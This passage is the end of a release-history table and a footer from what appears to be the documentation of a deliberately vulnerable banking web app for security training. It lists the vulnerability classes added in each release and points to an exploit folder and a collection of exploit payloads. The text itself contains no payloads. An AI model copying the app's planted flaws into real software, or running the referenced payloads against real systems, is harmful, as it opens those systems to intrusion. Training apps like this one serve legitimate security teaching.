| v4.0.0 | 2026-06-22 | Multi-framework annotations — PCI DSS v4.0, NIST SP 800-53 Rev 5, SANS/CWE Top 25 added to all vulnerabilities |
| v3.0.0 | 2026-06-17 | Latest threat classes — SSTI, Prompt Injection, Mass Assignment, JWT Algorithm Confusion, BOLA, ReDoS, XXE, CORS, HTTP Response Splitting, Prototype Pollution |
| v2.0.0 | 2026-06-15 | Multi-module expansion — 400+ findings, full API layer, services, middleware, scheduled jobs |
| v1.0.0 | 2026-06-09 | Initial release — core Flask app, 12 CWE types, SQLite persistence |

---

> This guide is updated with every release. For vulnerability-level detail see [docs/exploits/](docs/exploits/). For automated exploit payloads import [vulnbank.postman_collection.json](vulnbank.postman_collection.json) into Postman.
